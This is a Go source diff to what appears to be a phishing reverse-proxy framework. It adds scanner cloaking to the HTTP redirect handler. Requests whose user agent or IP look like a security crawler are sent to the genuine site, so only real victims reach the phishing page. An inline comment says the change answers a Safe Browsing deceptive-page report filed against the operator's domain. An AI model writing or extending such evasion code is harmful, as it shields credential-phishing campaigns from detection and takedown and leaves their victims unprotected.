@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"html/template"
 	"io/ioutil"
+	"net"
 	"net/http"
 	"net/url"
 	"path/filepath"
@@ -82,7 +83,40 @@ func (s *HttpServer) handleACMEChallenge(w http.ResponseWriter, r *http.Request)
 	w.Write([]byte(key))
 }
 
+// scannerBounceURL returns the genuine site a crawler should be sent to: the
+// phishlet's own unauth_url when one is set, else the global one. Empty means no
+// opinion, and the caller falls back to the plain https upgrade.
+func scannerBounceURL(p *HttpProxy, host string) string {
+	if p == nil || p.cfg == nil {
+		return ""
+	}
+	if pl := p.getPhishletByPhishHost(host); pl != nil {
+		if u := p.cfg.PhishletConfig(pl.Name).UnauthUrl; u != "" {
+			return u
+		}
+	}
+	return p.cfg.GetUnauthUrl()
+}
+
+// hostOnly drops a ":port" suffix from an address.
+func hostOnly(addr string) string {
+	if h, _, err := net.SplitHostPort(addr); err == nil {
+		return h
+	}
+	return addr
+}
+
 func (s *HttpServer) handleRedirect(w http.ResponseWriter, r *http.Request) {
+	// A crawler should leave our infrastructure on its very first hop. Over http
+	// the plain https upgrade keeps it on our own host - and that is the hop Safe
+	// Browsing sampled when it filed a deceptive-page report for the apex. Send
+	// scanners straight to the genuine site instead, exactly like the https path.
+	if isScannerUA(r.UserAgent()) || isScannerIP(hostOnly(r.RemoteAddr)) {
+		if u := scannerBounceURL(eproxy, r.Host); u != "" {
+			http.Redirect(w, r, u, http.StatusFound)
+			return
+		}
+	}
 	http.Redirect(w, r, "https://"+r.Host+r.URL.String(), http.StatusFound)
 }
 
